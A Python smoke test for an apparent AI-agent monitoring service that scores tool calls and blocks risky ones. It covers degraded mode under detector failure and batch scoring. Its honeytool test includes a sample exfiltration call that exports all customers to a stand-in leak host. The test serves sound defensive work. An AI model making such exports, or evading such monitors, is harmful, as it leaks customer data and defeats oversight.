"""
Smoke test for AgentShield-X Inference Service
Section 8 and Section 9 requirements:
- Loads models directly from versioned folders
- Returns valid Decision
- Tests degraded mode under detector timeout or failure
- Scores at least 200 test rows reliably
"""

import json
import os
import unittest
from unittest.mock import patch

from ml.inference import AgentShieldInferenceService, score_event
from ml.interfaces import Action, Decision, ToolCallEvent


BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
SPLITS_DIR = os.path.join(BASE_DIR, "ml", "data", "splits")


class TestInferenceSmoke(unittest.TestCase):

    def test_single_event_decision_contract(self):
        """Verifies score_event returns a valid Decision with risk, action, reason, and evidence."""
        event = ToolCallEvent(
            session_id="smoke_sess_01",
            step=0,
            tool="read_email",
            sensitivity="low",
            arguments={"email_id": "mail_nx_123"},
            task_text="Check customer support email",
        )
        decision = score_event(event)

        self.assertIsInstance(decision, Decision)
        self.assertIsInstance(decision.action, Action)
        self.assertGreaterEqual(decision.risk, 0.0)
        self.assertLessEqual(decision.risk, 1.0)
        self.assertTrue(len(decision.reason) > 0)
        self.assertIn("detector_scores", decision.evidence)
        self.assertIn("top_explanations", decision.evidence)

    def test_honeytool_hard_override(self):
        """Checks that touching honeytool export_all_customers immediately forces BLOCK."""
        event = ToolCallEvent(
            session_id="honey_test_sess",
            step=1,
            tool="export_all_customers",
            sensitivity="critical",
            arguments={"dest": "https://leak.example.test"},
            task_text="Summarize news",
        )
        decision = score_event(event)
        self.assertEqual(decision.action, Action.BLOCK)
        self.assertEqual(decision.risk, 1.0)
        self.assertTrue(decision.evidence.get("hard_override"))

    def test_degraded_mode(self):
        """Verifies inference service survives a detector failure and sets degraded_mode=True."""
        service = AgentShieldInferenceService()
        # Mock one detector to raise an exception
        with patch.object(service.similarity_detector, "score", side_effect=RuntimeError("Index corrupt")):
            event = ToolCallEvent(
                session_id="degraded_test",
                step=0,
                tool="read_webpage",
                arguments={"url": "https://example.test"},
                task_text="Read document",
            )
            decision = service.score_event(event)
            self.assertIsInstance(decision, Decision)
            self.assertTrue(decision.evidence.get("degraded_mode"))
            self.assertIn("similarity", decision.evidence.get("errors", {}))

    def test_batch_200_rows_smoke(self):
        """Loads and scores 200 rows from the frozen test set."""
        test_path = os.path.join(SPLITS_DIR, "traces_test.jsonl")
        if not os.path.exists(test_path):
            self.skipTest("traces_test.jsonl not found.")

        rows = []
        with open(test_path, "r", encoding="utf-8") as f:
            for line in f:
                if line.strip():
                    rows.append(json.loads(line))
                if len(rows) >= 200:
                    break

        self.assertGreaterEqual(len(rows), 200)

        for r in rows:
            event = ToolCallEvent(
                session_id=r["session_id"],
                step=r["step"],
                tool=r["tool"],
                sensitivity=r.get("sensitivity", "low"),
                arguments=r.get("arguments", {}),
                task_text=r.get("task_text", ""),
                context_segments=r.get("context_segments", []),
                taint=r.get("taint", []),
            )
            d = score_event(event)
            self.assertIsInstance(d.action, Action)
            self.assertGreaterEqual(d.risk, 0.0)
            self.assertLessEqual(d.risk, 1.0)


if __name__ == "__main__":
    unittest.main()
